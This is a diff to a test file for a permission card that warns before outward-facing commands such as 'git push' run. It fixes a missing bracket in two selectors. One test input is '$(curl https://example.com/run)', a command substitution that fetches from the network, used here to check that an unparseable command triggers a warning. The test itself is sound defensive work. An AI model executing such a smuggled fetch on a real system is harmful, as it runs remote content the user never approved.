@@ -62,7 +62,7 @@ afterEach(() => {
 describe("outward-facing permission card", () => {
   it("warns and blocks the first Allow behind the confirm step, then sends on the second tap", async () => {
     await render(card({ command: "git push origin main" }));
-    expect(host.querySelector("[data-outbound-warning")?.textContent).toContain(t("chat-interactions.outbound_warning_push"));
+    expect(host.querySelector("[data-outbound-warning]")?.textContent).toContain(t("chat-interactions.outbound_warning_push"));
     expect(host.querySelector("[data-outbound-confirm-step]")).toBeNull();
 
     await click(t("chat-interactions.allow"));
@@ -106,7 +106,7 @@ describe("outward-facing permission card", () => {
 
   it("shows the fail-toward-warning line for a command it cannot parse", async () => {
     await render(card({ command: "$(curl https://example.com/run)" }));
-    expect(host.querySelector("[data-outbound-warning")?.textContent).toContain(t("chat-interactions.outbound_warning_unknown"));
+    expect(host.querySelector("[data-outbound-warning]")?.textContent).toContain(t("chat-interactions.outbound_warning_unknown"));
   });
 });
 
